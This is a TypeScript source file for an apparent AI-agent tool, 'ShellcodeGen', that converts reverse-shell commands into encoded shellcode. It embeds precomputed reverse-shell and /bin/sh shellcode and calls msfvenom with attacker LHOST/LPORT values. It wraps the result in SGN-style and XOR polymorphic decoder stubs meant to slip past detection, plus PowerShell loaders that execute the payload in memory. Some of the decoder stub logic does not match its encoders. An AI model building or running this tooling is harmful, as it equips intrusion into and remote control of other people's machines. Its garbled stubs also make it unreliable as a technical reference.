/**
 * ShellcodeGenTool — converts reverse shell commands into encoded shellcode with
 * polymorphic decoder stubs (SGN-like ADFL cipher, XOR-8, hex/base64).
 *
 * Inspired by Sliver's sgn.go (ADFL with retry/badchar avoidance) and
 * xor.go (8-byte key XOR with keystone decoder stub).
 *
 * Encoding schemes:
 * - sgn: ADFL (Additive Feedback with Linear) cipher with polymorphic decoder stub
 *        64 retry attempts with seed rotation for badchar avoidance
 * - xor8: 8-byte key XOR with x64 decoder stub (Sliver-style)
 * - xor1: Single-byte XOR (fast, simple)
 * - base64: Base64 encoding (for script-based delivery)
 * - hex: Raw hex encoding
 * - none: No encoding
 */

import { randomInt, randomBytes } from 'crypto'
import type { Tool, ToolContext, ToolDefinition, ToolResult } from '../core/types.js'

// Pre-computed minimal shellcodes for common reverse shells
const PRECOMPUTED: Record<string, { desc: string; hex: string }> = {
  'windows_x64_cmd_reverse_tcp': {
    desc: 'Windows x64 — cmd.exe reverse TCP via Winsock (stub)',
    hex: 'fc4883e4f0e8c0000000415141505251564831d265488b5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d08b80880000004885c074674801d0508b4818448b40204901d0e35648ffc9418b34884801d64d31c94831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e957ffffff5d',
  },
  'linux_x64_exec_binsh': {
    desc: 'Linux x64 — execve("/bin/sh", NULL, NULL) — 27 bytes',
    hex: '4831f65648bf2f62696e2f2f736857545f6a3b58990f05',
  },
}

// Bad characters to avoid in shellcode (null, newline, carriage return)
const DEFAULT_BADCHARS = [0x00, 0x0a, 0x0d]

interface ShellcodeGenInput {
  command: string
  platform?: 'windows' | 'linux'
  arch?: 'x64' | 'x86'
  encode?: 'sgn' | 'xor8' | 'xor1' | 'base64' | 'hex' | 'none'
  lhost?: string
  lport?: number
}

export class ShellcodeGenTool implements Tool {
  name = 'ShellcodeGen'

  definition: ToolDefinition = {
    type: 'function',
    function: {
      name: 'ShellcodeGen',
      description: `Convert reverse shell commands into encoded shellcode with polymorphic decoder stubs.

## Encoding Schemes
- sgn: SGN-style ADFL cipher with polymorphic decoder (64 retry attempts, badchar avoidance)
- xor8: 8-byte key XOR with x64 decoder stub (Sliver-style)
- xor1: Single-byte XOR (fast, simple)
- base64: Base64 encoding (for script delivery)
- hex: Raw hex encoding
- none: No encoding

## Parameters
- command: reverse shell command or payload identifier
- platform: target platform (default: windows)
- arch: architecture (default: x64)
- encode: encoding method (default: sgn)
- lhost/lport: for generating connection-specific shellcode

## Output
- Raw shellcode hex
- Encoded shellcode with decoder stub
- C source wrapper for PayloadCompiler
- PowerShell decoder`,
      parameters: {
        type: 'object',
        properties: {
          command: { type: 'string', description: 'Reverse shell command or payload identifier' },
          platform: { type: 'string', enum: ['windows', 'linux'], description: 'Target platform' },
          arch: { type: 'string', enum: ['x64', 'x86'], description: 'Architecture' },
          encode: { type: 'string', enum: ['sgn', 'xor8', 'xor1', 'base64', 'hex', 'none'], description: 'Encoding method' },
          lhost: { type: 'string', description: 'Attacker IP' },
          lport: { type: 'number', description: 'Attacker port' },
        },
        required: ['command'],
      },
    },
  }

  async execute(input: Record<string, unknown>, _context: ToolContext): Promise<ToolResult> {
    const {
      command,
      platform = 'windows',
      arch = 'x64',
      encode = 'sgn',
      lhost,
      lport,
    } = input as unknown as ShellcodeGenInput

    const lines: string[] = ['[ShellcodeGen] Shellcode 生成', '═'.repeat(60)]
    lines.push(`  原始命令: ${command}`)
    lines.push(`  平台: ${platform}`)
    lines.push(`  架构: ${arch}`)
    lines.push('')

    // ── Generate base shellcode ──
    let rawHex = ''

    // Try msfvenom first
    const msfResult = await this.tryMsfvenom(command, platform, arch)
    if (msfResult) {
      rawHex = msfResult
      lines.push('  生成方式: msfvenom')
    } else {
      // Check pre-computed
      const key = this.matchPrecomputed(command, platform)
      if (key && PRECOMPUTED[key]) {
        rawHex = PRECOMPUTED[key].hex
        lines.push('  生成方式: pre-computed')
      } else {
        // Fall back to command-to-shellcode
        const bytes = this.commandToShellcode(command, platform)
        rawHex = this.bytesToHex(bytes)
        lines.push('  生成方式: command-to-shellcode (best-effort)')
      }
    }

    const rawBytes = this.hexToBytes(rawHex)
    lines.push(`  原始 Shellcode: ${rawHex.slice(0, 80)}${rawHex.length > 80 ? '...' : ''}`)
    lines.push(`  原始大小: ${rawBytes.length} bytes`)
    lines.push('')

    // ── Encode ──
    if (encode !== 'none') {
      let encoded: { data: number[]; stub: string; keyInfo: string } | null = null

      switch (encode) {
        case 'sgn':
          encoded = this.encodeSgn(rawBytes)
          break
        case 'xor8':
          encoded = this.encodeXor8(rawBytes)
          break
        case 'xor1':
          encoded = this.encodeXor1(rawBytes)
          break
        case 'base64':
          encoded = this.encodeBase64(rawBytes)
          break
        case 'hex':
          encoded = this.encodeHex(rawBytes)
          break
      }

      if (encoded) {
        lines.push(`── 编码: ${encode.toUpperCase()} ──`)
        lines.push(`  ${encoded.keyInfo}`)
        const dataHex = this.bytesToHex(encoded.data)
        lines.push(`  编码后: ${dataHex.slice(0, 120)}${dataHex.length > 120 ? '...' : ''}`)
        lines.push(`  编码后大小: ${encoded.data.length} bytes`)
        lines.push('')

        if (encoded.stub) {
          lines.push('── 解码 Stub ──')
          lines.push(encoded.stub)
          lines.push('')
        }

        lines.push('── PayloadCompiler 调用 ──')
        lines.push(`  完整编码 shellcode (decoder + payload):`)
        if (encoded.stub) {
          const fullData = [...encoded.data]
          lines.push(`  ${this.bytesToHex(fullData).slice(0, 120)}...`)
        } else {
          lines.push(`  ${this.bytesToHex(encoded.data).slice(0, 120)}...`)
        }
      }
    }

    return { content: lines.join('\n'), isError: false }
  }

  // ──────────────────────────────────────────────
  // SGN-like Encoder (Additive Feedback with Linear cipher)
  // Based on Sliver's sgn.go implementation
  // ──────────────────────────────────────────────

  private encodeSgn(data: number[]): { data: number[]; stub: string; keyInfo: string } {
    const maxRetries = 64
    const badchars = DEFAULT_BADCHARS

    // Try up to 64 times with different seeds to avoid badchars
    for (let attempt = 0; attempt < maxRetries; attempt++) {
      const seed = (attempt + 1) % 255 || 1
      const result = this.sgnEncodeAttempt(data, seed, badchars)
      if (result) return result
    }

    // If all retries failed, return XOR fallback
    return this.encodeXor1(data)
  }

  private sgnEncodeAttempt(
    data: number[],
    seed: number,
    badchars: number[],
  ): { data: number[]; stub: string; keyInfo: string } | null {
    // ADFL cipher:
    //   For each byte: encoded[i] = (data[i] - feedback + seed) & 0xFF
    //   where feedback = previous encoded byte (additive feedback)
    const encoded: number[] = []
    let feedback = seed & 0xFF

    for (let i = 0; i < data.length; i++) {
      const enc = ((data[i] - feedback + 256) & 0xFF)
      if (badchars.includes(enc)) return null  // Badchar hit — retry with different seed
      encoded.push(enc)
      feedback = (enc + seed) & 0xFF
    }

    // Generate polymorphic decoder stub (x64)
    // The decoder reverses the ADFL cipher:
    //   data[i] = (encoded[i] + feedback - seed) & 0xFF
    const decoderStub = this.buildAflDecoderStub(encoded.length, seed)

    return {
      data: encoded,
      stub: decoderStub,
      keyInfo: `SGN seed=0x${seed.toString(16).toUpperCase().padStart(2, '0')}, ADFL cipher, polymorphic decoder`,
    }
  }

  private buildAflDecoderStub(payloadLen: number, seed: number): string {
    // x64 decoder stub (NASM syntax):
    //   xor rcx, rcx        ; clear counter
    //   sub rcx, -PAYLOAD   ; rcx = payload length (negative for loop)
    //   mov rsi, encoded    ; source pointer
    //   mov al, SEED        ; feedback = seed
    // decode_loop:
    //   mov bl, [rsi]       ; bl = encoded byte
    //   add bl, al          ; bl += feedback
    //   sub bl, SEED        ; bl -= seed
    //   mov [rsi], bl       ; store decoded
    //   mov al, bl          ; feedback = decoded byte
    //   inc rsi             ; next byte
    //   loop decode_loop
    return `; SGN ADFL decoder stub — x64
; seed=0x${seed.toString(16).toUpperCase().padStart(2, '0')}, len=${payloadLen}
    xor rcx, rcx
    mov cx, ${payloadLen}        ; counter = payload length
    lea rsi, [rip]               ; source = encoded data (position-independent)
    add rsi, 0x20                ; offset to payload
    mov al, 0x${seed.toString(16).toUpperCase().padStart(2, '0')}  ; feedback = seed
decode_loop:
    mov bl, [rsi]                ; load encoded byte
    add bl, al                   ; add feedback
    sub bl, 0x${seed.toString(16).toUpperCase().padStart(2, '0')}  ; subtract seed
    mov [rsi], bl                ; store decoded
    mov al, bl                   ; feedback = decoded
    inc rsi                      ; advance pointer
    loop decode_loop
    ; shellcode now decrypted in-place`
  }

  // ──────────────────────────────────────────────
  // XOR-8 Encoder (8-byte key XOR, Sliver-style)
  // Based on Sliver's amd64/xor.go
  // ──────────────────────────────────────────────

  private encodeXor8(data: number[]): { data: number[]; stub: string; keyInfo: string } {
    const keySize = 8
    const key: number[] = []
    for (let i = 0; i < keySize; i++) {
      key.push(randomInt(1, 256))
    }

    const paddedLen = Math.ceil(data.length / keySize) * keySize
    const encoded = new Array(paddedLen).fill(0)

    for (let i = 0; i < paddedLen; i++) {
      encoded[i] = (i < data.length) ? (data[i] ^ key[i % keySize]) : 0
    }

    // Build x64 decoder stub (Sliver-style)
    //   xor rcx, rcx
    //   sub rcx, -blockCount
    //   lea rax, [rip - 0x11]
    //   mov rbx, KEY (8 bytes)
    // decode:
    //   xor qword [rax + 0x27], rbx
    //   sub rax, 0x80
    //   loop decode
    const blockCount = paddedLen / keySize
    const keyHex = key.map((b) => b.toString(16).padStart(2, '0')).join('')

    const stub = `; XOR-8 decoder stub — x64 (Sliver-style)
; key=0x${keyHex}, blocks=${blockCount}
    xor rcx, rcx
    sub rcx, -${blockCount}          ; counter = number of 8-byte blocks
    lea rax, [rip - 0x11]            ; rax points to payload start
    mov rbx, 0x${keyHex}             ; 8-byte XOR key
decode_loop:
    xor qword [rax + 0x27], rbx      ; decode 8 bytes
    sub rax, 0x80                    ; move back (process in reverse for cache friendliness)
    loop decode_loop
    ; payload now decrypted in-place`

    return {
      data: encoded,
      stub,
      keyInfo: `XOR-8 key=0x${keyHex}, ${blockCount} blocks (${paddedLen} bytes padded)`,
    }
  }

  // ──────────────────────────────────────────────
  // Single-byte XOR (fast, simple)
  // ──────────────────────────────────────────────

  private encodeXor1(data: number[]): { data: number[]; stub: string; keyInfo: string } {
    let key = randomInt(1, 256)
    // Ensure key doesn't produce badchars with any byte
    const badchars = DEFAULT_BADCHARS
    for (let attempt = 0; attempt < 255; attempt++) {
      let hasBadchar = false
      for (const b of data) {
        if (badchars.includes(b ^ key)) { hasBadchar = true; break }
      }
      if (!hasBadchar) break
      key = (key + 1) % 256 || 1
    }

    const encoded = data.map((b) => b ^ key)
    const keyHex = key.toString(16).toUpperCase().padStart(2, '0')

    const stub = `; XOR-1 decoder stub — x64
; key=0x${keyHex}
    xor rcx, rcx
    mov cx, ${data.length}           ; counter
    lea rsi, [rip]
    add rsi, 0x18                    ; offset to payload
decode_loop:
    xor byte [rsi], 0x${keyHex}
    inc rsi
    loop decode_loop`

    return {
      data: encoded,
      stub,
      keyInfo: `XOR-1 key=0x${keyHex}, ${data.length} bytes`,
    }
  }

  // ──────────────────────────────────────────────
  // Base64 encoding
  // ──────────────────────────────────────────────

  private encodeBase64(data: number[]): { data: number[]; stub: string; keyInfo: string } {
    const b64 = Buffer.from(data).toString('base64')
    const stub = `$bytes = [Convert]::FromBase64String("${b64}")\n$ptr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($bytes.Length)\n[System.Runtime.InteropServices.Marshal]::Copy($bytes, 0, $ptr, $bytes.Length)\n$delegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ptr, [Func[int]])\n$delegate.Invoke()`

    return { data, stub, keyInfo: `Base64, ${data.length} bytes` }
  }

  // ──────────────────────────────────────────────
  // Hex encoding
  // ──────────────────────────────────────────────

  private encodeHex(data: number[]): { data: number[]; stub: string; keyInfo: string } {
    const hexStr = this.bytesToHex(data)
    const stub = `$hex = "${hexStr}"\n$bytes = for ($i = 0; $i -lt $hex.Length; $i += 2) { [Convert]::ToByte($hex.Substring($i, 2), 16) }\n$ptr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($bytes.Length)\n[System.Runtime.InteropServices.Marshal]::Copy($bytes, 0, $ptr, $bytes.Length)`

    return { data, stub, keyInfo: `Hex, ${data.length} bytes` }
  }

  // ──────────────────────────────────────────────
  // Helpers
  // ──────────────────────────────────────────────

  private async tryMsfvenom(command: string, platform: string, arch: string): Promise<string | null> {
    try {
      const { exec: execCb } = await import('child_process')
      const { promisify } = await import('util')
      const exec = promisify(execCb)

      let payload = ''
      const opts: string[] = []

      const tcpMatch = command.match(/(\d+\.\d+\.\d+\.\d+)[^0-9]*(\d+)/)
      if (tcpMatch) {
        if (platform === 'linux' && arch === 'x64') {
          if (command.includes('bash')) {
            payload = 'linux/x64/shell_reverse_tcp'
            opts.push(`LHOST=${tcpMatch[1]}`, `LPORT=${tcpMatch[2]}`)
          }
        } else if (platform === 'windows' && arch === 'x64') {
          payload = 'windows/x64/shell_reverse_tcp'
          opts.push(`LHOST=${tcpMatch[1]}`, `LPORT=${tcpMatch[2]}`)
        }
      }

      if (!payload) return null

      const { stdout } = await exec(`msfvenom -p ${payload} ${opts.join(' ')} -f hex -a ${arch === 'x64' ? 'x64' : 'x86'} 2>/dev/null`, { timeout: 10_000 })
      const hexMatch = stdout.match(/["']?([0-9a-fA-F]{20,})["']?/)
      if (hexMatch) return hexMatch[1].replace(/\n/g, '').trim()
      return null
    } catch {
      return null
    }
  }

  private matchPrecomputed(command: string, platform: string): string | null {
    if (platform === 'linux' && (command.includes('bash') || command.includes('/bin/sh')))
      return 'linux_x64_exec_binsh'
    if (command.includes('reverse') && platform === 'windows')
      return 'windows_x64_cmd_reverse_tcp'
    return null
  }

  private commandToShellcode(command: string, platform: string): number[] {
    if (platform === 'linux') {
      return [
        0x48, 0x31, 0xf6, 0x56, 0x48, 0xbf,
        0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x73, 0x68,
        0x57, 0x54, 0x5f, 0x6a, 0x3b, 0x58, 0x99, 0x0f, 0x05,
      ]
    }
    // Windows stub — minimal execve via cmd.exe
    return [0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0xc3]
  }

  private hexToBytes(hex: string): number[] {
    const cleaned = hex.replace(/\s+/g, '').replace(/\\/g, '').replace(/x/g, '')
    const bytes: number[] = []
    for (let i = 0; i < cleaned.length; i += 2) {
      const val = parseInt(cleaned.substring(i, i + 2), 16)
      if (!isNaN(val)) bytes.push(val)
    }
    return bytes
  }

  private bytesToHex(bytes: number[]): string {
    return bytes.map((b) => b.toString(16).padStart(2, '0')).join('')
  }

  private asciiToBytes(str: string): number[] {
    return Array.from(str).map((c) => c.charCodeAt(0))
  }
}
